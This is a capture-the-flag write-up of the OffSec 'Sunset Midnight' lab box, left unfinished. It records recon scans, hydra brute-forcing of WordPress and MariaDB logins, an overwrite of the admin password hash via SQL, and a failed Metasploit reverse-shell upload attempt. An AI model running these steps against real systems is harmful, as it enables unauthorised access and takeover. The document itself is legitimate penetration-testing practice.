---
layout: post
title: "[Offsec] Sunset Midnight writeup"
categories: ctf offsec oscp
---

## Introduction

The challenge can be found at: [Offsec Labs Play](https://portal.offsec.com/labs/play)

![offsec](/assets/images/sunset/challenge.png)

## Recon

```
> sudo nmap -v -sV -AO -p- 192.168.166.88
Starting Nmap 7.95 ( https://nmap.org ) at 2024-07-10 17:09 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:09
Completed NSE at 17:09, 0.00s elapsed
Initiating NSE at 17:09
Completed NSE at 17:09, 0.00s elapsed
Initiating NSE at 17:09
Completed NSE at 17:09, 0.00s elapsed
Initiating Ping Scan at 17:09
Scanning 192.168.166.88 [4 ports]
Completed Ping Scan at 17:09, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:09
Scanning sunset-midnight (192.168.166.88) [65535 ports]
Discovered open port 80/tcp on 192.168.166.88
Discovered open port 3306/tcp on 192.168.166.88
Discovered open port 22/tcp on 192.168.166.88
Completed SYN Stealth Scan at 17:10, 35.39s elapsed (65535 total ports)
Initiating Service scan at 17:10
Scanning 3 services on sunset-midnight (192.168.166.88)
Completed Service scan at 17:10, 11.16s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against sunset-midnight (192.168.166.88)
Retrying OS detection (try #2) against sunset-midnight (192.168.166.88)
Retrying OS detection (try #3) against sunset-midnight (192.168.166.88)
Retrying OS detection (try #4) against sunset-midnight (192.168.166.88)
Retrying OS detection (try #5) against sunset-midnight (192.168.166.88)
Initiating Traceroute at 17:10
Completed Traceroute at 17:10, 0.05s elapsed
Initiating Parallel DNS resolution of 3 hosts. at 17:10
Completed Parallel DNS resolution of 3 hosts. at 17:10, 0.00s elapsed
NSE: Script scanning 192.168.166.88.
Initiating NSE at 17:10
Completed NSE at 17:10, 10.12s elapsed
Initiating NSE at 17:10
Completed NSE at 17:11, 21.14s elapsed
Initiating NSE at 17:11
Completed NSE at 17:11, 0.00s elapsed
Nmap scan report for sunset-midnight (192.168.166.88)
Host is up (0.043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)
|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)
|_  256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
|_http-title: Midnight Blog &#8211; Just another WordPress site
3306/tcp open  mysql   MariaDB 5.5.5-10.3.22
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 23
|   Capabilities flags: 63486
|   Some Capabilities: SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsCompression, Speaks41ProtocolNew, ODBCClient, Support41Auth, IgnoreSigpipes, LongColumnFlag, InteractiveClient, ConnectWithDatabase, SupportsLoadDataLocal, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: P)yG9&O<~+VOjGeFnx1'
|_  Auth Plugin Name: mysql_native_password
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/10%OT=22%CT=1%CU=42468%PV=Y%DS=4%DC=T%G=Y%TM=668F070
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=1
OS:01%GCD=1%ISR=10C%TI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%II=I%TS=A)
OS:SEQ(SP=105%GCD=1%ISR=10F%TI=Z%II=I%TS=A)SEQ(SP=FC%GCD=1%ISR=108%TI=Z%II=
OS:I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%
OS:O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W
OS:6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=CB59%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=CC59%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=CD59%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=CE
OS:59%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=CF59%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 31.673 days (since Sun Jun  9 01:01:36 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=252 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   39.97 ms 192.168.45.1
2   39.96 ms 192.168.45.254
3   40.60 ms 192.168.251.1
4   41.22 ms sunset-midnight (192.168.166.88)

NSE: Script Post-scanning.
Initiating NSE at 17:11
Completed NSE at 17:11, 0.00s elapsed
Initiating NSE at 17:11
Completed NSE at 17:11, 0.00s elapsed
Initiating NSE at 17:11
Completed NSE at 17:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.49 seconds
           Raw packets sent: 65822 (2.901MB) | Rcvd: 65660 (2.630MB)
```

My very first thought is to try the RegreSSHion exploitation on this SSH server using [this](https://github.com/xaitax/CVE-2024-6387_Check)

```
> python CVE-2024-6387_Check.py 192.168.166.88


                                      _________ _________ ___ ___ .__
_______   ____   ___________   ____  /   _____//   _____//   |   \|__| ____   ____
\_  __ \_/ __ \ / ___\_  __ \_/ __ \ \_____  \ \_____  \/    ~    \  |/  _ \ /    \
 |  | \/\  ___// /_/  >  | \/\  ___/ /        \/        \    Y    /  (  <_> )   |  \
 |__|    \___  >___  /|__|    \___  >_______  /_______  /\___|_  /|__|\____/|___|  /
             \/_____/             \/        \/        \/       \/                \/
    CVE-2024-6387 Vulnerability Checker
    v0.8 / Alex Hagenah / @xaitax / ah@primepage.de


Progress: 1/1 checks performed

🛡 Servers not vulnerable: 1
   [+] Server at 192.168.166.88 (running SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2)

🚨 Servers likely vulnerable: 0

⚠ Servers with unknown SSH version: 0

🔒 Servers with port(s) closed: 0

📊 Total scanned hosts: 1
📊 Total port checks performed: 1
```

Aww it didn't work.

Let's see if any of the services has known vulnerabilities.

```
> searchsploit openssh                                                                                             ~/Projects/OffSec/Labs/Sunset@homes5
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                                                  | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                                                    | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                                                      | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                                                | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                    | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                            | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                              | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                        | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                     | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                            | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                  | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                  | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                            | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                                                  | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                                                       | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                               | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                  | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                          | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                  | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                              | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                  | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                                                                            | multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                   | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                     | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                                                 | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                  | multiple/remote/3303.sh
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
> searchsploit apache 2.4.38                                                                                       ~/Projects/OffSec/Labs/Sunset@homes5
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                       | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                     | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                 | linux/local/46676.php
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                   | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                  | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                            | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                            | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                   | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                     | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                   | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                             | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)          | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)          | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                          | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                      | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
> searchsploit mariadb                                                                                             ~/Projects/OffSec/Labs/Sunset@homes5
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
MariaDB 10.2 - 'wsrep_provider' OS Command Execution                                                                  | linux/local/49765.txt
MariaDB Client 10.1.26 - Denial of Service (PoC)                                                                      | linux/dos/45901.txt
MySQL / MariaDB - Geometry Query Denial of Service                                                                    | linux/dos/38392.txt
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Escalation                              | linux/local/40360.py
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition             | linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation                               | linux/local/40679.sh
Oracle MySQL / MariaDB - Insecure Salt Generation Security Bypass                                                     | linux/remote/38109.pl
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's start with the web service. Upon opening it, we know that it's based on Wordpress.

```
> wpscan --url http://sunset-midnight                                                                              ~/Projects/OffSec/Labs/Sunset@homes5
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://sunset-midnight/ [192.168.166.88]
[+] Started: Wed Jul 10 17:54:46 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://sunset-midnight/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://sunset-midnight/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://sunset-midnight/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://sunset-midnight/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://sunset-midnight/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://sunset-midnight/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://sunset-midnight/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://sunset-midnight/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.6
 | Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simply-poll-master
 | Location: http://sunset-midnight/wp-content/plugins/simply-poll-master/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=========================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jul 10 17:54:53 2024
[+] Requests Done: 181
[+] Cached Requests: 7
[+] Data Sent: 44.892 KB
[+] Data Received: 13.335 MB
[+] Memory used: 306.121 MB
[+] Elapsed time: 00:00:06
```

Nothing relevant except for the login page. Let's crack it

```
> hydra -t 40 -l admin -P /usr/share/wordlists/passwords/rockyou-75.txt 192.168.166.88 http-form-post '/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwordpress%2Fwp-admin%2F&testcookie=1:incorrect' -e s
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-10 19:16:41
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 40 tasks per 1 server, overall 40 tasks, 59186 login tries (l:1/p:59186), ~1480 tries per task
[DATA] attacking http-post-form://192.168.166.88:80/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwordpress%2Fwp-admin%2F&testcookie=1:incorrect
[STATUS] 2462.00 tries/min, 2462 tries in 00:01h, 56724 to do in 00:24h, 40 active
```

In the mean time, we can take a look at the MariaDB service.

```
> hydra -t 40 -l root -P /usr/share/wordlists/passwords/rockyou-75.txt 192.168.166.88 mysql
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-10 17:43:59
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 59185 login tries (l:1/p:59185), ~14797 tries per task
[DATA] attacking mysql://192.168.166.88:3306/
[STATUS] 12.00 tries/min, 12 tries in 00:01h, 59173 to do in 82:12h, 4 active
[STATUS] 12.00 tries/min, 36 tries in 00:03h, 59149 to do in 82:10h, 4 active
[3306][mysql] host: 192.168.166.88   login: root   password: robert
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-10 17:50:48
```

```
> mariadb -u root -h 192.168.166.88 --ssl=false -p          
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 7949
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+
4 rows in set (0.050 sec)

MariaDB [(none)]> use wordpress_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress_db]> show tables;
+------------------------+
| Tables_in_wordpress_db |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_sp_polls            |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+------------------------+
13 rows in set (0.046 sec)

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.048 sec)    

```

Let's try to crack it with hashcat.

```
> hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/passwords/rockyou.txt.tar.gz
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/
Time.Started.....: Thu Jul 11 21:42:53 2024 (1 min, 6 secs)
Time.Estimated...: Thu Jul 11 21:43:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/passwords/rockyou.txt.tar.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   220.4 kH/s (0.93ms) @ Accel:256 Loops:256 Thr:64 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344383/14344383 (100.00%)
Rejected.........: 0/14344383 (0.00%)
Restore.Point....: 14344383/14344383 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7936-8192
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21525547425953544152213935] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: N/A
```

It did not work. Let's try replacing the password with our own, and we'll change it to the original one later. After reading about Wordpress hash structure [here](https://francescocarlucci.com/blog/cracking-wordpress-password-hash), we can generate a hash using [this](https://asecuritysite.com/hash/phpass)

```
MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.043 sec)

MariaDB [wordpress_db]> update wp_users set user_pass='$P$6abcdefghnG1D2F0o02m/Y8Up5Jpkm1';
Query OK, 1 row affected (0.047 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$6abcdefghnG1D2F0o02m/Y8Up5Jpkm1 | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.044 sec)
```

## Problem?

Upon login to the admin portal, the site became extremely slow, most requests take over 20 seconds to complete. And some requests failed unexpectedly.

![slow](/assets/images/sunset/slow.png)

![wp_error](/assets/images/sunset/wp_error.png)

I also tried using Metasploit, but no luck. I'm not sure if this is intentional, or a bug in the machine, but I couldn't continue the challenge. Will update this later.

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on [LHOST]:4444 
[*] Authenticating with WordPress using admin:dopdopyesyes...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
[*] Exploit completed, but no session was created.
```